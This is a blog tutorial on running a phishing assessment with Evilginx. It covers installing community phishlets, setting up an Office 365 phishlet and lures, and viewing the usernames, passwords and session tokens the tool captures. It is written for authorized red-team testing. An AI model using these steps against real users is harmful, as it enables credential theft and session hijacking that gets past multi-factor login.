---
title: Evilginx Quick-start Guide
description: A guide to quickly start a phishing assessment with Evilginx.
date: 2024-12-06
author: Nate Hess
image: /assets/blog/evilginx-quickstart-header.webp
imageAlt: Evilginx Quick-start Guide title art
tags:
  - Cybersecurity
  - Phishing
  - Evilginx
  - Evilginx2
  - Session Hijacking
draft: false
---

> A guide to quickly start a phishing assessment with Evilginx.

If you don't have Evilginx set up yet, see my [Evilginx on DigitalOcean Quick Installation Guide](https://medium.com/@nateahess/evilginx-on-digitalocean-6f2066e8a468).

To begin, run Evilginx so the configuration file is created:

```bash
evilginx2
```

![Evilginx started in a terminal](/assets/blog/evilginx-start-console.webp)

Type `exit` to leave the Evilginx console. Now that it has been started, a configuration file will be available at `~/.evilginx/config.json`.

Now that we have that out of the way, let's get into phishlets.

## 1. Install Phishlets

Phishlets are small configuration files used to configure Evilginx for specific websites during an authorized phishing assessment.

- They reside in the `phishlets` directory of the Evilginx binary.
- They are written in YAML.

You can create your own or use templates that others in the community have created. For this tutorial, we're using templates from [An0nUD4Y](https://github.com/An0nUD4Y/Evilginx2-Phishlets).

Clone the repository:

```bash
git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets
```

If Git isn't installed, run `apt-get install git`.

Move the phishlets to the appropriate directory:

```bash
cp -r Evilginx2-Phishlets/* /usr/share/evilginx2/phishlets/
```

Verify that they copied by checking the directory:

```bash
ls -l /usr/share/evilginx2/phishlets/
```

Launch Evilginx again:

```bash
evilginx2
```

## 2. Configure a Phishlet

In the Evilginx console, use this syntax to configure the phishlet you want to use:

```bash
phishlets hostname <phishlet name> <hostname>
```

Example:

```bash
phishlets hostname o365 login.my-phishing-url.com
```

![Evilginx phishlet hostname configuration](/assets/blog/evilginx-configure-phishlet.webp)

> Some phishlets automatically add a subdomain prefix such as `login.` or `academy.`. Make sure you have A records set up for these domains wherever you're hosting your Evilginx server.

Next, enable the phishlet:

```bash
phishlets enable <phishlet name>
```

![An enabled Evilginx phishlet](/assets/blog/evilginx-enable-phishlet.webp)

If Evilginx cannot obtain a valid TLS certificate, you may not have an A record set up for the proper domain or subdomain. The full domain it is looking for should be listed in the error.

## 3. Create a Lure

A lure is the URL you want an authorized assessment target to click. It sets up the link to the phishlet page.

Type `lures` to see the list of available lures.

![Evilginx lure list](/assets/blog/evilginx-list-lures.webp)

To create a new lure for the phishlet you configured, run:

```bash
lures create <phishlet name>
```

![Creating an Evilginx lure](/assets/blog/evilginx-create-lure.webp)

To retrieve its URL, run:

```bash
lures get-url <lure id>
```

![Retrieving an Evilginx lure URL](/assets/blog/evilginx-get-lure-url.webp)

This is the URL you would use in an authorized phishing campaign.

## 4. Run the Assessment

How you distribute the URL is up to the scope and rules of engagement for the assessment. Once the test user opens it, the page should resemble the landing page of the account you are assessing, based on the phishlet template selected.

![An example phishing landing page](/assets/blog/evilginx-login-page.webp)

When a user signs in, Evilginx presents the captured username, password, and session token.

![Captured session information in Evilginx](/assets/blog/evilginx-captured-session.webp)

To view captured session tokens, run:

```bash
sessions
```

To view a specific session, run:

```bash
sessions <session id>
```

Evilginx presents the session token or cookie:

![Evilginx session token output](/assets/blog/evilginx-session-token.webp)

> This material is intended only for authorized security testing. Misuse can be unlawful and may cause real harm. Always work within a documented scope and rules of engagement.
